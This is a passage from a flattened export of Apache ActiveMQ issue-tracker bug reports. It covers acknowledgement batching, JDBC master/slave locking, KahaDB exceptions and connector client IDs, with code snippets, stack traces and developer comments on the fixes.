    private void afterMessageIsConsumed(MessageDispatch md, boolean messageExpired) throws JMSException {
        if (unconsumedMessages.isClosed()) {
            return;
        }
        if (messageExpired) {
            synchronized (deliveredMessages) {
                deliveredMessages.remove(md);
            }
            stats.getExpiredMessageCount().increment();
            ackLater(md, MessageAck.DELIVERED_ACK_TYPE);
        } else {
            stats.onMessage();
            if (session.getTransacted()) {
                // Do nothing.
            } else if (isAutoAcknowledgeEach()) {
                if (deliveryingAcknowledgements.compareAndSet(false, true)) {
                    synchronized (deliveredMessages) {
                        if (!deliveredMessages.isEmpty()) {
                            if (optimizeAcknowledge) {
                                ackCounter++;
                                if (ackCounter >= (info.getPrefetchSize() * .65) || System.currentTimeMillis() >= (optimizeAckTimestamp + optimizeAckTimeout)) {
                                	MessageAck ack = makeAckForAllDeliveredMessages(MessageAck.STANDARD_ACK_TYPE);
                                	if (ack != null) {
                            		    deliveredMessages.clear();
                            		    ackCounter = 0;
                            		    session.sendAck(ack);
                            		    optimizeAckTimestamp = System.currentTimeMillis();
                                	}
                                }
                            } else {
                                MessageAck ack = makeAckForAllDeliveredMessages(MessageAck.STANDARD_ACK_TYPE);
                                if (ack!=null) {
                                    deliveredMessages.clear();
                                    session.sendAck(ack);
                                }
                            }
                        }
                    }
                    deliveryingAcknowledgements.set(false);
                }
            } else if (isAutoAcknowledgeBatch()) {
                ackLater(md, MessageAck.STANDARD_ACK_TYPE);
            } else if (session.isClientAcknowledge()||session.isIndividualAcknowledge()) {
                boolean messageUnackedByConsumer = false;
                synchronized (deliveredMessages) {
                    messageUnackedByConsumer = deliveredMessages.contains(md);
                }
                if (messageUnackedByConsumer) {
                    ackLater(md, MessageAck.DELIVERED_ACK_TYPE);
                }
            } 
            else {
                throw new IllegalStateException(""Invalid session state."");
            }
        }
    }

{noformat}

What will happen when no producer will send a message to this queue so that no message will pass this method? When will the deliveredMessages been acked?


",Windows 7 and Linux Debian with JRE 1.6.24 or JRE 1.6.27,davsclaus,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,224115,,,Tue Sep 18 10:16:42 UTC 2012,,,,,,,,,,,"0|i0aicn:",59246,,,,,,,,,,,,,,,,,,,,,"17/Jan/12 16:00;gtully;I suspect you need to explicitly set a cache level (use cacheLevel or cacheLevelName attributes) for the component. It defaults to cache_auto which means cache_consumer when there is no transaction. So the consumer is not actually closed.
If the consumer is closed, any outstanding auto ack will be dispatched.;;;","18/Jan/12 12:09;matw;When I switch to another cache than CACHE_AUTO or CACHE CONSUMER, I get a dramatic deterioration of performance. Then I am faster when I do not use ptimizeAcknowledge = true. This cannot be the goal of this setting!
The other problem is I do not want to close the consumer. Yes, I want to close the producer, but the consumer should consume and acknowledge all existing messages in the queue. The consumer should not care about how many producers produce messages to the queue. ;;;","18/Jan/12 12:50;gtully;How do you stop the consumer? When the consumer is stopped it needs to be shutdown, so if it is cached, it needs to be really closed, because optimizeAcknowledge delays acks (to batch them) for a period or till half of the prefetch is reached or till it is closed. The expectation is that there will be duplicate delivery if the consumer is not closed.
The default auto ack mode, does an immediate ack.

The other alternative is to use transactions to batch your client acks, I think this may be the simplest approach. 
Another option is to use client ack mode and periodically call acknowledge, but with camel, this would require your own processor to get access to the underlying activemq message to call acknowledge.

I think first, validate that the consumer is closed when it is shutdown.

For this case, we may need to introduce a consumer task that does a periodic ack, to catch the case where the consumer is cached, there is a pause in production, and there are pending acks. But in the abortive case, there may still be duplicates.;;;","08/Sep/12 10:20;davsclaus;Gary

Yeah maybe a multiplexed background thread could run and acknowledge the messages if the consumer has been inactive for a period.
I wonder if we can use a single thread for all optimized ack consumers, I would assume a thread per consumer would bee too much?;;;","12/Sep/12 08:02;tabish;The simplest thing would probably be to add a task to the Schedular instance that's owned by ActiveMQConnection that can check for time since last ack on the consumer and fire an ack if the configured time has elapsed.;;;","18/Sep/12 10:16;tabish;added option optimizedAckScheduledAckInterval to Connection and MessageConsumer to allow for a configurable async ack of outstanding messages.  By default this option is set to zero, meaning no async acks are sent.  If the user wants to ensure all messages are acked at some point then they can enable this by setting to a value greater than zero.  ;;;","18/Sep/12 10:16;tabish;fixed in trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"No information of destinations is present on web console or jconsole even my activemq_msgs, have lots of destinations when broker starts up",AMQ-3655,12537536,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,wangyin,wangyin,06/Jan/12 16:19,13/Feb/12 08:48,14/Jul/23 05:43,07/Jan/12 19:24,5.5.0,,,,,5.6.0,,,Message Store,,,,0,jdbcstorage,,,,,,,,"I have just noted that there is no information about existing destinations on web console or jconsole after my broker starts up.These destinations exist on my message table activemq_msgs and they are present again when some producers or consumers are active.
I'm sure this works well on 5.2 because I had used this to inspect my destinations before 2 years ago.
I also check the source code of class Statements and find that the query statement of 5.5 is different from the old one.
The statement of 5.5 likes this:
findAllDestinationsStatement = ""SELECT DISTINCT CONTAINER FROM "" + getFullAckTableName();
while 5.2 is the following:
findAllDestinationsStatement = ""SELECT DISTINCT CONTAINER FROM "" + getFullMessageTableName();
In my option,JDBCAdapter should fetch all destinations from the message table,not ack table.
Is it a mistake or what's the reason about this changing?",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3712,,AMQ-3526,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,223042,,,Fri Feb 10 12:12:00 UTC 2012,,,,,,,,,,,"0|i0aid3:",59248,,,,,,,,,,,,,,,,,,,,,"06/Jan/12 16:33;tabish;Have you tested this against the latest 5.6-SNAPSHOT, I think there were already some fixes in this area.;;;","06/Jan/12 16:45;wangyin;While I just checked the source code of apache-activemq-5.5.1-fuse-01-11,it's correct.;;;","07/Jan/12 19:24;tabish;Fixed by AMQ-3526;;;","10/Feb/12 12:12;kimmking; the method:queue.size() is always unstable.
sometimes show "" queue.size:-1"" on web console or JMX for jconsole;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
JDBC Master/Slave : Slave cannot acquire lock when the master loose database connection.,AMQ-3654,12537523,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,gtully,rmartin,rmartin,06/Jan/12 15:11,20/Aug/12 11:31,14/Jul/23 05:43,13/Jun/12 21:55,5.5.0,,,,,5.7.0,,,,,,,2,,,,,,,,,"Our configuration is JDBC Master/Slave with one master and one slave. When the master is started, he acquire the database lock.
Then when the slave is started, he wait to acquire the database lock. When the master loose the network connection to the database, the lock in the database is not removed and the slave connot acquire the database lock. In this situation, the master is unable to respond to client (due to network failure)
and the slave is not started because he can't acquire the database lock.

When the master is killed, the slave can't acquire the database lock too. After the network connection is restored, when the master starts, it cannot
acquire lock to the database (because the lod lock is always present) so now, we have two slaves and no master.

Please, refer to this issue which is the same problem : AMQ-1958 ","Unix/Redhat 5.6
ActiveMQ 5.5.0
Oracle 10G",ceposta,donnchadh,farhad1205,gshx,gtully,ibeaumont,mikmela,ranpeng,wangyin,zeeiyer,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-1958,AMQ-3681,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,223029,,,Mon Aug 20 11:31:56 UTC 2012,,,,,,,,,,,"0|i0agr3:",58987,,,,,,,,,,,,,,,,,,,,,"06/Jan/12 16:33;wangyin;
I guess When the master loose the network connection to the database,the underlying jdbc connection can not detect the network connection is broken in time.
You can try to set the value of property lockKeepAlivePeriod of jdbcPersistenceAdapter to be smaller than default value(default 30s).
If it works please let me know,thanks.;;;","09/Jan/12 17:21;rmartin;Thanks for the suggestion, i tried to set the property lockKeepAlivePeriod to 3s with this configuration :

<jdbcPersistenceAdapter lockKeepAlivePeriod=""3000""  dataDirectory=""${activemq.base}/data"" dataSource=""#oracle-ds"" />

But it didn't work. When the network connection on the master is lost, the lock is still present in the database. Any other idea which can solve the network failure test ?

Do you think, i can use the jdbc mode configured with useDatabaseLock=""false"" ? It seem to be a master/master solution. We need to have a HA Solution with no message lost. With the shared database, the message are stored in the same place. So if the master1 fail, the message is stored in the database and our client switch to the master2 and he can consume the message. Is it correct or i must use a Jdbc master/slave with useDatabaseLock=""true"" to have a HA solution ?;;;","10/Jan/12 01:16;wangyin;Seem it's the business for oracle to handle this situation because it doest not detect the broken connection and release the row lock in time.
You can consult your DBA for more advice.
;;;","26/Jan/12 14:35;metatech;If the database connection is abruptly lost (no TCP FIN nor RST), for instance when the network cable is unplugged, the DB client application cannot release the lock anymore.
The DB server itself needs to detect the dead connection.
On Oracle the parameter ""SQLNET.EXPIRE_TIME"" can be used.
;;;","10/Feb/12 10:47;kimmking;metatech's suggestion is nice.

Exclusive Lock in this point is magic and dangerous way.
 Under certain conditions, this error will occur.
   And if a storage do not support the lock like this, sadness happens.;;;","14/May/12 08:26;ranpeng;i use the mysql database to store messages ,and i met the same problem. When the master loose the network connection to the database, the lock in the database is not removed and the slave connot acquire the database lock.after the network recovery connection ,the master still can't acquire lock to the database  so now, we have two slaves and no master.period of time , the master process automatically exit,remaining a slave.Any other idea which can solve the network failure test ?;;;","13/Jun/12 21:55;gtully;Added a lease based data base locker. Use as follows from xml config with the 5.7-SNAPSHOT{code}       <ioExceptionHandler>
            <jDBCIOExceptionHandler/>
        </ioExceptionHandler>

        <persistenceAdapter>
            <jdbcPersistenceAdapter lockKeepAlivePeriod=""1000"" lockAcquireSleepInterval=""2000"">
                <databaseLocker>
                    <lease-database-locker/>
                </databaseLocker>
            </jdbcPersistenceAdapter>
        </persistenceAdapter>
{code}
The optional IOExceptionHandler will pause/resume the transport connectors on any IO exception related to access to the DB.
The lease based lock is acquired by blocking at start and retained by the keepAlivePeriod. To retain, the lease is extended by the lockAcquireSleepInterval, so in theory the master is always {code}lockAcquireSleepInterval-lockKeepAlivePeriod{code} ahead of the slave w.r.t the lease.
The lease is dropped on normal shutdown.
The broker system clock is not in sync with the db, a maxAllowableDiffFromDBTime > 0 will adjust the lease duration if the skew exceeds the absolute maxAllowableDiffFromDBTime value, allowing the db to dictate the utc basis for the lease.;;;","13/Jun/12 21:58;gtully;would appreciate if you could validate the efficacy of this lease based approach in your environment using the latest 5.7-SNAPSHOT 
;;;","08/Aug/12 09:43;gshx;Thanks Gary. What is the suggested patch back-porting process in case I want to apply this patch to my v5.6 broker running the jdbc master-slave configuration against oracle? Should I just build the core jar from source after applying the changes to v5.6 code in my local svn repo?;;;","08/Aug/12 09:53;gtully;maybe first try a 5.7-SNAPSHOT to validate it works in your use case, but sure, an updated activemq-core is all that you will need.;;;","08/Aug/12 10:13;gshx;Thanks Gary, will first test with the 5.7-SNAPSHOT.;;;","08/Aug/12 16:14;zeeiyer;+1 for the lock lease approach with the deck loaded in favor of the current leasee. That's how i have seen it work with Terracotta and many other implementations...Seems like just the implementation needs to be tested out.;;;","10/Aug/12 02:10;gshx;Tested 5.7-SNAPSHOT with MySQL and the patch works just fine. The BROKER_NAME also seems to be getting populated in the lock table.;;;","13/Aug/12 08:59;wangyin;For row lock based database locker, I use the same configuration file for all brokers.
This makes deployment job simple really.
LeaseDatabaseLocker need specify the unique lease id, by default it's broker name, 
so does this mean I have to specify different broker name for each one in the cluster?
The last confusion is should lockAcquireSleepInterval be greater than lockKeepAlivePeriod anyway?
;;;","20/Aug/12 11:31;gtully;@SuoNayi 
yes, either the brokerName or the lease-database-locker.leaseHolderId needs to be unique for a master/slave pair.
And yes, lockAcquireSleepInterval > lockKeepAlivePeriod is necessary.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
content-length header should be considered only for SEND frames,AMQ-3653,12537308,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,05/Jan/12 12:32,17/Jan/12 16:15,14/Jul/23 05:43,05/Jan/12 13:03,5.5.0,,,,,5.6.0,,,,,,,0,,,,,,,,,If for example ACK frame contains content-length it will not be parsed correctly as broker will try to read a body of the specified length. We should only try to do this for SEND commands and ignore the header for others.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,222816,,,Tue Jan 17 16:15:22 UTC 2012,,,,,,,,,,,"0|i0aidb:",59249,,,,,,,,,,,,,,,,,,,,,"05/Jan/12 13:03;dejanb;Fixed with svn revision 1227577;;;","17/Jan/12 16:15;tabish;Added a small fix for the test.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"If the broker binds RMI registry port when it starts up, the broker should release RMI registry port when it shuts down",AMQ-3651,12537199,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,chirino,chirino,chirino,04/Jan/12 15:19,04/Jan/12 15:35,14/Jul/23 05:43,04/Jan/12 15:35,5.5.1,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,222708,,,Wed Jan 04 15:35:07 UTC 2012,,,,,,,,,,,"0|i0aidr:",59251,,,,,,,,,,,,,,,,,,,,,"04/Jan/12 15:35;chirino;Fixed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NPE when KahaDB fails to store to Journal with EOFException,AMQ-3649,12537157,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Trivial,Fixed,,sslavic,sslavic,04/Jan/12 09:47,13/Jan/12 14:10,14/Jul/23 05:43,13/Jan/12 14:10,5.5.0,,,,,5.6.0,,,Message Store,,,,0,,,,,,,,,"
{noformat}
2012-01-03 19:17:50,646 | DEBUG | commit: TX:ID:foo-7365-1325617993757-0:1:1 syncCount: 2 | org.apache.activemq.transaction.LocalTransaction | ActiveMQ Transport: tcp:///bar:13219
2012-01-03 19:17:50,650 | ERROR | KahaDB failed to store to Journal | org.apache.activemq.store.kahadb.MessageDatabase | ActiveMQ Transport: tcp:///bar:13219
java.io.EOFException
	at java.io.RandomAccessFile.readFully(RandomAccessFile.java:383)
	at java.io.RandomAccessFile.readFully(RandomAccessFile.java:361)
	at org.apache.kahadb.page.PageFile.readPage(PageFile.java:779)
	at org.apache.kahadb.page.Transaction$2.readPage(Transaction.java:440)
	at org.apache.kahadb.page.Transaction$2.<init>(Transaction.java:431)
	at org.apache.kahadb.page.Transaction.openInputStream(Transaction.java:428)
	at org.apache.kahadb.page.Transaction.load(Transaction.java:404)
	at org.apache.kahadb.page.Transaction.load(Transaction.java:361)
	at org.apache.kahadb.index.BTreeIndex.loadNode(BTreeIndex.java:262)
	at org.apache.kahadb.index.BTreeIndex.getRoot(BTreeIndex.java:174)
	at org.apache.kahadb.index.BTreeIndex.put(BTreeIndex.java:189)
	at org.apache.activemq.store.kahadb.MessageDatabase.upadateIndex(MessageDatabase.java:1026)
	at org.apache.activemq.store.kahadb.MessageDatabase$AddOpperation.execute(MessageDatabase.java:1777)
	at org.apache.activemq.store.kahadb.MessageDatabase$18.execute(MessageDatabase.java:976)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)
	at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:973)
	at org.apache.activemq.store.kahadb.MessageDatabase$13.visit(MessageDatabase.java:874)
	at org.apache.activemq.store.kahadb.data.KahaCommitCommand.visit(KahaCommitCommand.java:130)
	at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:856)
	at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:783)
	at org.apache.activemq.store.kahadb.KahaDBTransactionStore.commit(KahaDBTransactionStore.java:270)
	at org.apache.activemq.transaction.LocalTransaction.commit(LocalTransaction.java:72)
	at org.apache.activemq.broker.TransactionBroker.commitTransaction(TransactionBroker.java:173)
	at org.apache.activemq.broker.MutableBrokerFilter.commitTransaction(MutableBrokerFilter.java:103)
	at org.apache.activemq.broker.TransportConnection.processCommitTransactionOnePhase(TransportConnection.java:420)
	at org.apache.activemq.command.TransactionInfo.visit(TransactionInfo.java:100)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:306)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:179)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
	at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:227)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:220)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:202)
	at java.lang.Thread.run(Thread.java:619)
2012-01-03 19:17:50,650 | WARN  | Store COMMIT FAILED:  | org.apache.activemq.transaction.LocalTransaction | ActiveMQ Transport: tcp:///bar:13219
java.lang.NullPointerException
	at org.apache.activemq.util.DefaultIOExceptionHandler.handle(DefaultIOExceptionHandler.java:54)
	at org.apache.activemq.broker.BrokerService.handleIOException(BrokerService.java:2193)
	at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:804)
	at org.apache.activemq.store.kahadb.KahaDBTransactionStore.commit(KahaDBTransactionStore.java:270)
	at org.apache.activemq.transaction.LocalTransaction.commit(LocalTransaction.java:72)
	at org.apache.activemq.broker.TransactionBroker.commitTransaction(TransactionBroker.java:173)
	at org.apache.activemq.broker.MutableBrokerFilter.commitTransaction(MutableBrokerFilter.java:103)
	at org.apache.activemq.broker.TransportConnection.processCommitTransactionOnePhase(TransportConnection.java:420)
	at org.apache.activemq.command.TransactionInfo.visit(TransactionInfo.java:100)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:306)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:179)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
	at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:227)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:220)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:202)
	at java.lang.Thread.run(Thread.java:619)
2012-01-03 19:17:50,651 | DEBUG | rollback: TX:ID:foo-7365-1325617993757-0:1:1 syncCount: 2 | org.apache.activemq.transaction.LocalTransaction | ActiveMQ Transport: tcp:///bar:13219
2012-01-03 19:17:50,651 | DEBUG | Error occured while processing sync command: TransactionInfo {commandId = 229, responseRequired = true, type = 2, connectionId = ID:foo-7365-1325617993757-0:1, transactionId = TX:ID:foo-7365-1325617993757-0:1:1}, exception: javax.transaction.xa.XAException: STORE COMMIT FAILED: Transaction rolled back. | org.apache.activemq.broker.TransportConnection.Service | ActiveMQ Transport: tcp:///bar:13219
javax.transaction.xa.XAException: STORE COMMIT FAILED: Transaction rolled back.
	at org.apache.activemq.transaction.LocalTransaction.commit(LocalTransaction.java:77)
	at org.apache.activemq.broker.TransactionBroker.commitTransaction(TransactionBroker.java:173)
	at org.apache.activemq.broker.MutableBrokerFilter.commitTransaction(MutableBrokerFilter.java:103)
	at org.apache.activemq.broker.TransportConnection.processCommitTransactionOnePhase(TransportConnection.java:420)
	at org.apache.activemq.command.TransactionInfo.visit(TransactionInfo.java:100)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:306)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:179)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
	at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:227)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:220)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:202)
	at java.lang.Thread.run(Thread.java:619)
Caused by: java.lang.NullPointerException
	at org.apache.activemq.util.DefaultIOExceptionHandler.handle(DefaultIOExceptionHandler.java:54)
	at org.apache.activemq.broker.BrokerService.handleIOException(BrokerService.java:2193)
	at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:804)
	at org.apache.activemq.store.kahadb.KahaDBTransactionStore.commit(KahaDBTransactionStore.java:270)
	at org.apache.activemq.transaction.LocalTransaction.commit(LocalTransaction.java:72)
	... 13 more
{noformat}",,lichtin,sslavic,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"04/Jan/12 09:48;sslavic;DefaultIOExceptionHandler.java.patch;https://issues.apache.org/jira/secure/attachment/12509393/DefaultIOExceptionHandler.java.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,222667,,,Fri Jan 13 14:10:46 UTC 2012,,,,,,,Patch Available,,,,"0|i0aidz:",59252,,,,,,,,,,,,,,,,,,,,,"04/Jan/12 09:48;sslavic;Attaching patch [^DefaultIOExceptionHandler.java.patch];;;","13/Jan/12 14:10;tabish;fix applied.  Thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NullPointerException while loading node from kahadb during vmcursor replay,AMQ-3637,12535341,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,15/Dec/11 17:34,16/Dec/11 10:14,14/Jul/23 05:43,16/Dec/11 10:14,5.5.1,,,,,5.6.0,,,Broker,,,,0,expiry,kahadb,recovery,ttl,vmQueueCursor,,,,"When the vmQueueCursor is used with persistent messages that have a time to live (ttl) expiry set. If the broker down time exceeds the ttl, on recovery the messages are replayed through the vm cursor and an expiry check is done, leading to the messages getting deleted. This nested kahaDB transaction (to remove the message) can badly effect the iterator traversing the store, leading to missed messages and the NPE below. The recovery processing needs to be batched such that periodic expiry can occur with out nesting transactions.
{code}INFO | Recovery replayed 7784653 operations from the journal in 895.065 seconds.
 INFO | ActiveMQ 5.5.1-fuse-01-11 JMS Message Broker () is starting
 INFO | For help or more information please see: http://activemq.apache.org/
ERROR | Failed to start ActiveMQ JMS Message Broker (). Reason: java.lang.NullPointerException
java.lang.NullPointerException
	at org.apache.kahadb.index.BTreeIndex.loadNode(BTreeIndex.java:264)
	at org.apache.kahadb.index.BTreeNode$BTreeIterator.findNextPage(BTreeNode.java:103)
	at org.apache.kahadb.index.BTreeNode$BTreeIterator.hasNext(BTreeNode.java:121)
	at org.apache.activemq.store.kahadb.MessageDatabase$MessageOrderIndex$MessageOrderIterator.hasNext(MessageDatabase.java:2597)
	at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore$3.execute(KahaDBStore.java:506)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:760)
	at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.recover(KahaDBStore.java:502)
	at org.apache.activemq.store.ProxyMessageStore.recover(ProxyMessageStore.java:52)
	at org.apache.activemq.broker.region.Queue.initialize(Queue.java:267)
	at org.apache.activemq.broker.region.DestinationFactoryImpl.createDestination(DestinationFactoryImpl.java:86)
	at org.apache.activemq.broker.region.AbstractRegion.createDestination(AbstractRegion.java:487)
	at org.apache.activemq.broker.region.AbstractRegion.addDestination(AbstractRegion.java:125)
	at org.apache.activemq.broker.region.RegionBroker.addDestination(RegionBroker.java:301)
	at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145)
	at org.apache.activemq.advisory.AdvisoryBroker.addDestination(AdvisoryBroker.java:145)
	at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145)
	at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145)
	at org.apache.activemq.broker.MutableBrokerFilter.addDestination(MutableBrokerFilter.java:151)
	at org.apache.activemq.broker.region.AbstractRegion.start(AbstractRegion.java:97)
	at org.apache.activemq.broker.region.RegionBroker.start(RegionBroker.java:201)
	at org.apache.activemq.broker.BrokerFilter.start(BrokerFilter.java:157)
	at org.apache.activemq.broker.BrokerFilter.start(BrokerFilter.java:157)
	at org.apache.activemq.broker.TransactionBroker.start(TransactionBroker.java:123)
	at org.apache.activemq.broker.BrokerService$3.start(BrokerService.java:1814)
	at org.apache.activemq.broker.BrokerService.start(BrokerService.java:494)
	at ...
 INFO | ActiveMQ Message Broker (null) is shutting down{code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,221025,,,Fri Dec 16 10:14:03 UTC 2011,,,,,,,,,,,"0|i0agrb:",58988,,,,,,,,,,,,,,,,,,,,,"16/Dec/11 10:14;gtully;fix in http://svn.apache.org/viewvc?rev=1214888&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
JmsTopicConnector checks for presence of localClientId then uses outboundClientId,AMQ-3635,12535011,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,jeffgillings,jeffgillings,13/Dec/11 20:31,31/Jan/12 21:56,14/Jul/23 05:43,31/Jan/12 21:56,5.4.2,,,,,5.6.0,,,Connector,,,,0,,,,,,,,,"On the JMS bridge topic connector, if I set the outboundClientId but not the localClientId, then the outbound client id will not be set.
This is because the JmsTopicConnector only sets the outboundClientId if the localClientId is set.  This appears to be a bug.

Here is 5.4.2 JmsTopicConnector.initializeForeignTopicConnection

{code}
    protected void initializeForeignTopicConnection() throws NamingException, JMSException {
        if (outboundTopicConnection == null) {
            // get the connection factories
            if (outboundTopicConnectionFactory == null) {
                // look it up from JNDI
                if (outboundTopicConnectionFactoryName != null) {
                    outboundTopicConnectionFactory = (TopicConnectionFactory)jndiOutboundTemplate
